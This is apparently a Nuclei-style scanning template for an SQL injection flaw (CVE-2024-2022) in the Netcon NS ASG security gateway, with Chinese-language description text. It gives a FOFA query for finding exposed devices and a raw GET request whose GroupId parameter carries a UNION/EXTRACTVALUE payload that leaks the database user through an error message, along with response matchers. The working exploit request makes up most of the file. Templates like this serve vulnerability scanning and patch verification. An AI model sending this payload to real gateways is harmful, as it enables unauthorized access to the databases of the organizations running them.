id: nsasg-sql-injection

info:
  name: 网康科技NS ASG应用安全网关SQL注入漏洞
  author: 0dayPoc
  severity: high
  description: |-
    fofa: app="网康科技-NS-ASG安全网关"
        网康科技NS ASG应用安全网关存在SQL注入漏洞，攻击者可通过构造恶意输入利用该漏洞执行非授权数据库查询。该产品作为软硬件一体化的安全网关设备，集成SSL/IPSec协议栈，支持多链路负载均衡及13种认证机制（含短信认证/LDAP令牌/USB KEY）。
  reference:
  - CVE-2024-2022
  tags: 网康科技

http:
- raw:
  - |
    GET /admin/list_ipAddressPolicy.php?GroupId=-1+UNION+ALL+SELECT+EXTRACTVALUE(1,concat(0x7e,(select+user()),0x7e)) HTTP/1.1
    Host: {{Hostname}}
    Accept-Language: zh-CN,zh;q=0.9
    Connection: close
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Accept-Encoding: gzip, deflate
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: body
    words:
    - 'syntax'
  - type: word
    part: body
    words:
    - 'error'
